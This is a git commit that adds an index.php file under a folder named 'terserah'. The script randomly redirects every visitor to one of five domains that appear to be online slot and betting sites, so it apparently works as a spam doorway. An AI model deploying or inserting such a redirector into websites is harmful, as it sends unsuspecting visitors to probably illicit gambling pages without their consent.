0e2c1fe380dfbeac70b040f2c050e399f0c2169b
bpkprabowo <monikaandian1212@gmail.com>
2024-09-10 00:59:23 +0700

    Create index.php

---
+++ terserah/index.php
@@ -0,0 +1,19 @@
+<?php
+// Array of URLs to redirect to
+$urls = [
+    'https://sateslot77.online',
+    'https://nagaforwinapi.store',
+    'https://bimatoto.vip',
+    'https://nasgorbetspesial.xyz',
+    'https://burungbetsip.fun',
+    
+    // Add more URLs here
+];
+
+// Pick a random URL from the array
+$random_url = $urls[array_rand($urls)];
+
+// Redirect to the selected URL
+header("Location: $random_url");
+exit();
+?>
